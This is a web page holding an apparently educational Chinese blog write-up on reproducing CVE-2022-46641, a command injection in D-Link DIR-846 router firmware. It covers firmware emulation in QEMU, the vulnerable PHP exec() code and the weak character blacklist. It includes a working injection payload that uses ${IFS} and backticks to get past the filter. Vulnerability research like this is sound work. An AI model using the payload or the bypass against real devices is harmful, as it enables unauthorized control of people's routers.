<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CVE-2022-46641 D-Link dir-846命令注入漏洞 | CAI dog</title>
<meta name="keywords" content="">
<meta name="description" content="CVE-2022-46641 D-Link dir-846命令注入漏洞 漏洞信息 D-Link dir-846路由，是D-Link生产的小型家用路由器。
该漏洞是对用户输入的字符串检测不够严格造成的。
固件版本：A1_FW100A43
影响范围：dlink:dir-846_firmware:100a43
测试环境：Ubuntu20 &#43; qemu模拟debian
环境模拟 在[github]([IoTvuln/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md at main · CyberUnicornIoT/IoTvuln · GitHub](https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md))上的信息显示固件的版本为：A1_FW100A43
我们可以直接在[官网](D-Link Technical Support (dlink.com.cn))进行下载
下载下来后使用binwalk解压：
binwalk -Me1 DIR846A1_FW100A43.bin 便可以得到一个类似linux系统根目录的文件夹
这里我们先找到我们需要启动的服务路径和名称。
根据经验，名称一般和httpd相关所以我们直接搜索httpd相关的文件：
可以看到在 /usr/sbin目录下有一个lighttpd文件，那么我们可以试一试这个文件：
首先看一看目标文件的架构：
可以看到是32位mips的小段
qemu-user 启动失败 这里我们选择qemu-mipsel-static（qemu-mips-static是大段架构），把qemu复制到dlink的根目录下后，启动http服务：
sudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf -L .：类似于chroot .
-D：显示报错信息
-f ：指定配置文件
然后我们进行访问：
发现服务可以访问，但浏览器上什么都没有，同时终端上有报错信息：
根据报错信息，我们可以大致猜测该问题应该是php相关的服务没有启动（大致猜测（×），百度一下（√））。例如 backend died指的是后端出错了，那么可能是php中的管理后端cgi的服务：fastcgi没有启动
我们退出qemu，搜索一下php-fastcgi相关的文件：
这里根据linux目录，可以判断我们需要启动 /etc/init.d/php7-fastcgi。">
<meta name="author" content="shangdi4sb">
<link rel="canonical" href="https://jellyfish-pro.github.io/posts/cve-2022-46641-d-link-dir-846%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://jellyfish-pro.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://jellyfish-pro.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="CVE-2022-46641 D-Link dir-846命令注入漏洞" />
<meta property="og:description" content="CVE-2022-46641 D-Link dir-846命令注入漏洞 漏洞信息 D-Link dir-846路由，是D-Link生产的小型家用路由器。
该漏洞是对用户输入的字符串检测不够严格造成的。
固件版本：A1_FW100A43
影响范围：dlink:dir-846_firmware:100a43
测试环境：Ubuntu20 &#43; qemu模拟debian
环境模拟 在[github]([IoTvuln/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md at main · CyberUnicornIoT/IoTvuln · GitHub](https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md))上的信息显示固件的版本为：A1_FW100A43
我们可以直接在[官网](D-Link Technical Support (dlink.com.cn))进行下载
下载下来后使用binwalk解压：
binwalk -Me1 DIR846A1_FW100A43.bin 便可以得到一个类似linux系统根目录的文件夹
这里我们先找到我们需要启动的服务路径和名称。
根据经验，名称一般和httpd相关所以我们直接搜索httpd相关的文件：
可以看到在 /usr/sbin目录下有一个lighttpd文件，那么我们可以试一试这个文件：
首先看一看目标文件的架构：
可以看到是32位mips的小段
qemu-user 启动失败 这里我们选择qemu-mipsel-static（qemu-mips-static是大段架构），把qemu复制到dlink的根目录下后，启动http服务：
sudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf -L .：类似于chroot .
-D：显示报错信息
-f ：指定配置文件
然后我们进行访问：
发现服务可以访问，但浏览器上什么都没有，同时终端上有报错信息：
根据报错信息，我们可以大致猜测该问题应该是php相关的服务没有启动（大致猜测（×），百度一下（√））。例如 backend died指的是后端出错了，那么可能是php中的管理后端cgi的服务：fastcgi没有启动
我们退出qemu，搜索一下php-fastcgi相关的文件：
这里根据linux目录，可以判断我们需要启动 /etc/init.d/php7-fastcgi。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://jellyfish-pro.github.io/posts/cve-2022-46641-d-link-dir-846%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" /><meta property="article:section" content="posts" />



<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CVE-2022-46641 D-Link dir-846命令注入漏洞"/>
<meta name="twitter:description" content="CVE-2022-46641 D-Link dir-846命令注入漏洞 漏洞信息 D-Link dir-846路由，是D-Link生产的小型家用路由器。
该漏洞是对用户输入的字符串检测不够严格造成的。
固件版本：A1_FW100A43
影响范围：dlink:dir-846_firmware:100a43
测试环境：Ubuntu20 &#43; qemu模拟debian
环境模拟 在[github]([IoTvuln/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md at main · CyberUnicornIoT/IoTvuln · GitHub](https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md))上的信息显示固件的版本为：A1_FW100A43
我们可以直接在[官网](D-Link Technical Support (dlink.com.cn))进行下载
下载下来后使用binwalk解压：
binwalk -Me1 DIR846A1_FW100A43.bin 便可以得到一个类似linux系统根目录的文件夹
这里我们先找到我们需要启动的服务路径和名称。
根据经验，名称一般和httpd相关所以我们直接搜索httpd相关的文件：
可以看到在 /usr/sbin目录下有一个lighttpd文件，那么我们可以试一试这个文件：
首先看一看目标文件的架构：
可以看到是32位mips的小段
qemu-user 启动失败 这里我们选择qemu-mipsel-static（qemu-mips-static是大段架构），把qemu复制到dlink的根目录下后，启动http服务：
sudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf -L .：类似于chroot .
-D：显示报错信息
-f ：指定配置文件
然后我们进行访问：
发现服务可以访问，但浏览器上什么都没有，同时终端上有报错信息：
根据报错信息，我们可以大致猜测该问题应该是php相关的服务没有启动（大致猜测（×），百度一下（√））。例如 backend died指的是后端出错了，那么可能是php中的管理后端cgi的服务：fastcgi没有启动
我们退出qemu，搜索一下php-fastcgi相关的文件：
这里根据linux目录，可以判断我们需要启动 /etc/init.d/php7-fastcgi。"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "vuln",
      "item": "https://jellyfish-pro.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "CVE-2022-46641 D-Link dir-846命令注入漏洞",
      "item": "https://jellyfish-pro.github.io/posts/cve-2022-46641-d-link-dir-846%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CVE-2022-46641 D-Link dir-846命令注入漏洞",
  "name": "CVE-2022-46641 D-Link dir-846命令注入漏洞",
  "description": "CVE-2022-46641 D-Link dir-846命令注入漏洞 漏洞信息 D-Link dir-846路由，是D-Link生产的小型家用路由器。\n该漏洞是对用户输入的字符串检测不够严格造成的。\n固件版本：A1_FW100A43\n影响范围：dlink:dir-846_firmware:100a43\n测试环境：Ubuntu20 + qemu模拟debian\n环境模拟 在[github]([IoTvuln/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md at main · CyberUnicornIoT/IoTvuln · GitHub](https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md))上的信息显示固件的版本为：A1_FW100A43\n我们可以直接在[官网](D-Link Technical Support (dlink.com.cn))进行下载\n下载下来后使用binwalk解压：\nbinwalk -Me1 DIR846A1_FW100A43.bin 便可以得到一个类似linux系统根目录的文件夹\n这里我们先找到我们需要启动的服务路径和名称。\n根据经验，名称一般和httpd相关所以我们直接搜索httpd相关的文件：\n可以看到在 /usr/sbin目录下有一个lighttpd文件，那么我们可以试一试这个文件：\n首先看一看目标文件的架构：\n可以看到是32位mips的小段\nqemu-user 启动失败 这里我们选择qemu-mipsel-static（qemu-mips-static是大段架构），把qemu复制到dlink的根目录下后，启动http服务：\nsudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf -L .：类似于chroot .\n-D：显示报错信息\n-f ：指定配置文件\n然后我们进行访问：\n发现服务可以访问，但浏览器上什么都没有，同时终端上有报错信息：\n根据报错信息，我们可以大致猜测该问题应该是php相关的服务没有启动（大致猜测（×），百度一下（√））。例如 backend died指的是后端出错了，那么可能是php中的管理后端cgi的服务：fastcgi没有启动\n我们退出qemu，搜索一下php-fastcgi相关的文件：\n这里根据linux目录，可以判断我们需要启动 /etc/init.d/php7-fastcgi。",
  "keywords": [
    
  ],
  "articleBody": "CVE-2022-46641 D-Link dir-846命令注入漏洞 漏洞信息 D-Link dir-846路由，是D-Link生产的小型家用路由器。\n该漏洞是对用户输入的字符串检测不够严格造成的。\n固件版本：A1_FW100A43\n影响范围：dlink:dir-846_firmware:100a43\n测试环境：Ubuntu20 + qemu模拟debian\n环境模拟 在[github]([IoTvuln/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md at main · CyberUnicornIoT/IoTvuln · GitHub](https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md))上的信息显示固件的版本为：A1_FW100A43\n我们可以直接在[官网](D-Link Technical Support (dlink.com.cn))进行下载\n下载下来后使用binwalk解压：\nbinwalk -Me1 DIR846A1_FW100A43.bin 便可以得到一个类似linux系统根目录的文件夹\n这里我们先找到我们需要启动的服务路径和名称。\n根据经验，名称一般和httpd相关所以我们直接搜索httpd相关的文件：\n可以看到在 /usr/sbin目录下有一个lighttpd文件，那么我们可以试一试这个文件：\n首先看一看目标文件的架构：\n可以看到是32位mips的小段\nqemu-user 启动失败 这里我们选择qemu-mipsel-static（qemu-mips-static是大段架构），把qemu复制到dlink的根目录下后，启动http服务：\nsudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf -L .：类似于chroot .\n-D：显示报错信息\n-f ：指定配置文件\n然后我们进行访问：\n发现服务可以访问，但浏览器上什么都没有，同时终端上有报错信息：\n根据报错信息，我们可以大致猜测该问题应该是php相关的服务没有启动（大致猜测（×），百度一下（√））。例如 backend died指的是后端出错了，那么可能是php中的管理后端cgi的服务：fastcgi没有启动\n我们退出qemu，搜索一下php-fastcgi相关的文件：\n这里根据linux目录，可以判断我们需要启动 /etc/init.d/php7-fastcgi。\n那么现在出现了一个严峻的问题：我们需要使用模拟环境同时启动两个服务，但是qemu的user模式不支持两个模拟环境联动，所以我们需要使用qemu的system模式。\nqemu-system 启动成功 因为需要涉及到两个服务联动，所以我们使用qemu-system模拟一个debian系统。\n首先我们需要为qemu-system搭建一个网桥：\nsudo ifconfig ens33 down # 先停用host的网卡\rsudo brctl addbr br0 # 添加名为br0的网桥\rsudo brctl addif br0 ens33 # 将host的网卡插到网桥br0上\rsudo brctl stp br0 off # 如果只有一个网桥，则关闭生成树协议\rsudo ifconfig br0 0.0.0.0 promisc up # 启用br0网桥，不分配ip，混杂模式\rsudo ifconfig ens33 0.0.0.0 promisc up # 启用host网卡，不分配ip，混杂模式\rsudo dhclient br0 # 让网桥从dhcp获取ip\rsudo tunctl -t tap0 # 创建一个tap网络设备，名字为tap0\rsudo brctl addif br0 tap0 # 将tap0插到网桥\rsudo ifconfig tap0 0.0.0.0 promisc up # 启用tap0，不分配ip，混杂模式 查看ifconfig可以看到已经配置成功：\n然后，我们需要下载qemu-system模拟debain系统的内核文件和硬盘文件（下载（×），找师兄白嫖（√））：\n接下来使用命令开启qemu-system:\nsudo qemu-system-mipsel -M malta -m 512 \\\r-kernel vmlinux-3.2.0-4-4kc-malta-x86 \\\r-hda debian_wheezy_mipsel_standard.qcow2 \\\r-append \"root=/dev/sda1 console=ttyS0\" \\\r-net nic,macaddr=00:19:3e:00:00:01 -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no -kernel：选择内核版本，这里选择lighttpd符合的版本\n-hda：选择硬盘文件\n-nographic：不适用GUI图形界面\n-net nic -net tap,ifname=tap0,script=no,downscript=no：选择桥接模式，使用刚刚我们创建的网卡\n启动成功后，给qemu-system分配ip：\nifconfig eth0 然后使用scp将固件中的linux根目录传进qemu-system（注：这里需要先将固件的根目录打包，再传入qemu-system，否则scp将会破坏掉固件中的软连接）\n随后解压，挂载debian系统的/proc和/dev：\nmount --bind /proc ./proc\rmount --bind /dev ./dev\rchroot . /bin/bash 最后启动服务：\n**注：**在启动过程中会遇到如缺少文件的报错，这种报错缺少什么文件我们就创建什么文件就好了\n./etc/init.d/php7-fastcgi start\r./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf 漏洞复现 **注：**该漏洞需要登陆获取cookie\n首先我们来到路由器登陆界面开启抓包：\n输入密码后看到抓包：\n这里我们可以看到抓到了两个登陆的包。具体的原因我们后面编写exp时会提到，这里我们先使用第二个登陆包里的cookie\n将这个cookie复制到poc上，就可以执行命令了：\n{\"SetIpMacBindSettings\":{\"lan_unit\":\"0\",\"lan(0)_dhcps_staticlist\":\"1,`touch${IFS}/tmp/yorktown`asdasdasd,12:34:56:78:90:11,192.168.0.9\"}} 这里我修改了命令，原poc的命令是reboot，太大开大合了，相比之下创建一个文件显得十分的低调。符合黑客低调的行事风格（雾）\n复现结果如下\n漏洞点代码分析 根据git上的poc我们可以看到，该漏洞是存在于 /www/HNAP1/control/SetIpMacBindSettings.php文件中\n对源码的分析，我们可以看到源码的原本流程大致是对路由器上的mac地址做一个记录和修改。但是因为没有对传入的参数做足够的限制，所以导致了命令注入.\n大概的流程为：\n#SetIpMacBindSettings.php:35\r$staticlist = explode(\";\", $option['lan(0)_dhcps_staticlist']); 这里是读取了poc上带有命令的字段，为了直观感受，我在源码中输出了这个值：\n随后，进入循环，将值赋给 $val：\n#SetIpMacBindSettings.php:74\rforeach ($staticlist as $val) 接下来，代码会将我们输入的值根据 “,”分割：\n#SetIpMacBindSettings.php:75\r$vl_arr = explode(\",\", $val); 所以我们的命令存放在 $val[1]中，\n最后跟随着另外的命令一起执行：\n#SetIpMacBindSettings.php:80\rexec(\"changename.sh \" . $vl_arr[2] . \" \" . $vl_arr[1]); 当然，在源码中，开发者对输入的字符进行了限制，其目的就是为了防止命令的注入。但是很明显，这种限制是会被攻击者轻松绕过的。\n例如如下代码：\n#SetIpMacBindSettings.php:54\r$special_char_arr = array(\"\\'\", \" \", \"\\\"\");\rif (contains_special_char($vl_arr[1], $special_char_arr)) {\r$result[\"message\"] = \"specil character.\";\r$this-\u003eapi_response(__CLASS__, $result);\r}\r#HNAP1/core/fun/public.php:420\rfunction contains_special_char($str, $special_char_arr)\r{\rfor ($i = 0; $i \u003c count($special_char_arr); $i++) {\rif (strpos($str, $special_char_arr[$i]) !== false) {\rreturn true;\r}\r}\rreturn false;\r} 可以看到上面的代码，首先生成了一个黑名单，然后将黑名单和我们输入的字符放入 contains_special_char函数中，通过观察函数的定义，我们也可以判断这是一个对特殊字符进行检测的函数。\n但是问题恰恰出在这里，因为只检测了空格符号和转义符，但是当我们使用如 ${IFS} \\t等可以代替空格的符号时，就可以绕过检测，从而非法执行命令。\nexp编写 通过上面的漏洞复现，我们可以知道exp需要经历的流程：\n第一次登陆——》第二次登陆——》获取cookie——》发送命令 那么，为什么登陆时会有发送两个包，这两个包有什么关系吗？\n通过在浏览器里的记录（开发者模式中对网络发包的记录），我们可以找到一些线索：\n这是第一次登陆发送的包头，而返回的包头中多出来了一个Set-Cookie的字段：\n然后第二次登陆的请求头中，就将这个字段当作了cookie的一部分：\n同时在cookie中多出来了两个别的字段，而这两个字段则是来自上一个返回包的数据部分：\n这里可以看到uid是直接把返回包的cookie字段复制过去了，但是privatekey是怎么得到的呢？\n我们只能又去找源码了。\n因为我们是通过login.html点击登陆按钮开始发包的，所以可以从这个文件寻找按钮事件开始寻找：\n#/www/login.html:404\r通过这个onClinck事件，我们可以追朔到 \\www\\Login.html:243\n这里定义了点击登陆按钮之后的流程，这里的具体流程我们可以不用了解，但是我们需要关注一段代码：\n#\\www\\Login.html:244\rvar Login_Password = document.getElementById(\"admin_Password1\").value;\rvar Login_Captcha = \"\";\rdocument.getElementById(\"logIn_btn\").disabled = true;\rdocument.getElementById(\"error_1\").style.display = \"none\";\rdoLogin(Login_Password, Login_Captcha) 这一段代码，就是将我们在网页上输入的密码，传入了一个叫做 doLogin()的函数。\n根据经验，我们可以猜测，这个函数里就是处理密码的地方 根据经验（×），这么大一个login就写在上面（√）\n通过寻找，我们追寻到了 \\www\\js\\Login.js\n在这里我们就可以看到上面privatekey的来历了：\n#\\www\\js\\Login.js:16\rPrivateKey = md5(obj.PublicKey + ifLogin_Password + obj.Challenge);\rPrivateKey = PrivateKey.toUpperCase();\t//将PrivateKey全改为大写 这个 ifLogin_Password 就是咱们传进来的密码\n现在我们知道这个privatekey是怎么来的了。\n但是我们先不要着急，因为在下面，有一个非常重要的东西就是密码的加密过程：\n#\\www\\js\\Login.js:28\r$.cookie('PrivateKey', PrivateKey, {path: '/'});\rvar Login_Passwd = md5(PrivateKey + obj.Challenge);\rLogin_Passwd = Login_Passwd.toUpperCase(); 到这里，整个密码的加密过程就完整了：\n先使用md5加密（PublicKey + Password + Challenge）得到privatekey，然后再使用md5加密（privatekey + Challenge） ",
  "wordCount" : "385",
  "inLanguage": "en",
  "datePublished": "0001-01-01T00:00:00Z",
  "dateModified": "0001-01-01T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "shangdi4sb"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://jellyfish-pro.github.io/posts/cve-2022-46641-d-link-dir-846%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "CAI dog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://jellyfish-pro.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://jellyfish-pro.github.io" accesskey="h" title="CAI dog (Alt + H)">CAI dog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://jellyfish-pro.github.io/search" title="search (Alt &#43; /)" accesskey=/>
                    <span>search</span>
                </a>
            </li>
            <li>
                <a href="https://jellyfish-pro.github.io/" title="home">
                    <span>home</span>
                </a>
            </li>
            <li>
                <a href="https://jellyfish-pro.github.io/posts" title="posts">
                    <span>posts</span>
                </a>
            </li>
            <li>
                <a href="https://jellyfish-pro.github.io/note" title="note">
                    <span>note</span>
                </a>
            </li>
            <li>
                <a href="https://jellyfish-pro.github.io/ctf" title="ctf">
                    <span>ctf</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a>&nbsp;»&nbsp;<a href="https://jellyfish-pro.github.io/posts/">vuln</a></div>
    <h1 class="post-title">
      CVE-2022-46641 D-Link dir-846命令注入漏洞
    </h1>
    <div class="post-meta">2 min&nbsp;·&nbsp;shangdi4sb

</div>
  </header> <div class="toc">
    <details  open>
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#cve-2022-46641-d-link-dir-846%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e" aria-label="CVE-2022-46641 D-Link dir-846命令注入漏洞">CVE-2022-46641 D-Link dir-846命令注入漏洞</a><ul>
                        
                <li>
                    <a href="#%e6%bc%8f%e6%b4%9e%e4%bf%a1%e6%81%af" aria-label="漏洞信息">漏洞信息</a></li>
                <li>
                    <a href="#%e7%8e%af%e5%a2%83%e6%a8%a1%e6%8b%9f" aria-label="环境模拟">环境模拟</a><ul>
                        
                <li>
                    <a href="#qemu-user-%e5%90%af%e5%8a%a8%e5%a4%b1%e8%b4%a5" aria-label="qemu-user 启动失败">qemu-user 启动失败</a></li>
                <li>
                    <a href="#qemu-system-%e5%90%af%e5%8a%a8%e6%88%90%e5%8a%9f" aria-label="qemu-system 启动成功">qemu-system 启动成功</a></li></ul>
                </li>
                <li>
                    <a href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0" aria-label="漏洞复现">漏洞复现</a></li>
                <li>
                    <a href="#%e6%bc%8f%e6%b4%9e%e7%82%b9%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90" aria-label="漏洞点代码分析">漏洞点代码分析</a></li>
                <li>
                    <a href="#exp%e7%bc%96%e5%86%99" aria-label="exp编写">exp编写</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="cve-2022-46641-d-link-dir-846命令注入漏洞">CVE-2022-46641 D-Link dir-846命令注入漏洞<a hidden class="anchor" aria-hidden="true" href="#cve-2022-46641-d-link-dir-846命令注入漏洞">#</a></h2>
<h3 id="漏洞信息">漏洞信息<a hidden class="anchor" aria-hidden="true" href="#漏洞信息">#</a></h3>
<p>D-Link dir-846路由，是D-Link生产的小型家用路由器。</p>
<p>该漏洞是对用户输入的字符串检测不够严格造成的。</p>
<p>固件版本：A1_FW100A43</p>
<p>影响范围：<strong>dlink:dir-846_firmware:100a43</strong></p>
<p>测试环境：Ubuntu20 + qemu模拟debian</p>
<h3 id="环境模拟">环境模拟<a hidden class="anchor" aria-hidden="true" href="#环境模拟">#</a></h3>
<p>在[github]([IoTvuln/D-Link dir-846 SetIpMacBindSettings Command Injection Vulnerability.md at main · CyberUnicornIoT/IoTvuln · GitHub](<a href="https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link">https://github.com/CyberUnicornIoT/IoTvuln/blob/main/d-link/dir-846/D-Link</a> dir-846 SetIpMacBindSettings Command Injection Vulnerability.md))上的信息显示固件的版本为：A1_FW100A43</p>
<p>我们可以直接在[官网](<a href="http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-846">D-Link Technical Support (dlink.com.cn)</a>)进行下载</p>
<p>下载下来后使用binwalk解压：</p>
<pre tabindex="0"><code>binwalk -Me1 DIR846A1_FW100A43.bin
</code></pre><p>便可以得到一个类似linux系统根目录的文件夹</p>
<p><img loading="lazy" src="/CVE-2022-46641_D-Link_dir-846_Command_Injection.assets/image-20230104143631939.png" alt="image-20230104143631939"  />
</p>
<p>这里我们先找到我们需要启动的服务路径和名称。</p>
<p>根据经验，名称一般和httpd相关所以我们直接搜索httpd相关的文件：</p>
<p><img loading="lazy" src="/CVE-2022-46641_D-Link_dir-846_Command_Injection.assets/image-20230104150209686.png" alt="image-20230104150209686"  />
</p>
<p>可以看到在 <code>/usr/sbin</code>目录下有一个lighttpd文件，那么我们可以试一试这个文件：</p>
<p>首先看一看目标文件的架构：</p>
<p><img loading="lazy" src="/CVE-2022-46641_D-Link_dir-846_Command_Injection.assets/image-20230104151137097.png" alt="image-20230104151137097"  />
</p>
<p>可以看到是32位mips的小段</p>
<h4 id="qemu-user-启动失败">qemu-user 启动失败<a hidden class="anchor" aria-hidden="true" href="#qemu-user-启动失败">#</a></h4>
<p>这里我们选择qemu-mipsel-static（qemu-mips-static是大段架构），把qemu复制到dlink的根目录下后，启动http服务：</p>
<pre tabindex="0"><code>sudo ./qemu-mipsel-static -L . ./usr/sbin/lighttpd -D -f ./etc/lighttpd/lighttpd.conf
</code></pre><blockquote>
<p><code>-L .</code>：类似于chroot .</p>
<p><code>-D</code>：显示报错信息</p>
<p><code>-f</code> ：指定配置文件</p>
</blockquote>
<p><img loading="lazy" src="/CVE-2022-46641_D-Link_dir-846_Command_Injection.assets/image-20230104152711152.png" alt="image-20230104152711152"  />
</p>
<p>然后我们进行访问：</p>
<p>发现服务可以访问，但浏览器上什么都没有，同时终端上有报错信息：</p>
<p><img loading="lazy" src="/CVE-2022-46641_D-Link_dir-846_Command_Injection.assets/image-20230104153205878.png" alt="image-20230104153205878"  />
</p>
<p>根据报错信息，我们可以大致猜测该问题应该是php相关的服务没有启动（<del>大致猜测（×），百度一下（√）</del>）。例如 <code>backend died</code>指的是后端出错了，那么可能是php中的管理后端cgi的服务：fastcgi没有启动</p>
<p>我们退出qemu，搜索一下php-fastcgi相关的文件：</p>
<p><img loading="lazy" src="/CVE-2022-46641_D-Link_dir-846_Command_Injection.assets/image-20230104153612925.png" alt="image-20230104153612925"  />
</p>
<p>这里根据linux目录，可以判断我们需要启动 <code>/etc/init.d/php7-fastcgi</code>。</p>
<p>那么现在出现了一个严峻的问题：我们需要使用模拟环境同时启动两个服务，但是qemu的user模式不支持两个模拟环境联动，所以我们需要使用qemu的system模式。</p>
<h4 id="qemu-system-启动成功">qemu-system 启动成功<a hidden class="anchor" aria-hidden="true" href="#qemu-system-启动成功">#</a></h4>
<p>因为需要涉及到两个服务联动，所以我们使用qemu-system模拟一个debian系统。</p>
<p>首先我们需要为qemu-system搭建一个网桥：</p>
<pre tabindex="0"><code>sudo ifconfig ens33 down                 # 先停用host的网卡
sudo brctl addbr br0                     # 添加名为br0的网桥
sudo brctl addif br0 ens33               # 将host的网卡插到网桥br0上
sudo brctl stp br0 off                   # 如果只有一个网桥，则关闭生成树协议
sudo ifconfig br0 0.0.0.0 promisc up     # 启用br0网桥，不分配ip，混杂模式
sudo ifconfig ens33 0.0.0.0 promisc up   # 启用host网卡，不分配ip，混杂模式
sudo dhclient br0                        # 让网桥从dhcp获取ip

sudo tunctl -t tap0                      # 创建一个tap网络设备，名字为tap0
sudo brctl addif br0 tap0                # 将tap0插到网桥
sudo ifconfig tap0 0.0.0.0 promisc up    # 启用tap0，不分配ip，混杂模式
</code></pre><p>查看ifconfig可以看到已经配置成功：</p>
<p><img loading="lazy" src="/CVE-2022-46641_D-Link_dir-846_Command_Injection.assets/image-20230104155156784.png" alt="image-20230104155156784"  />
</p>
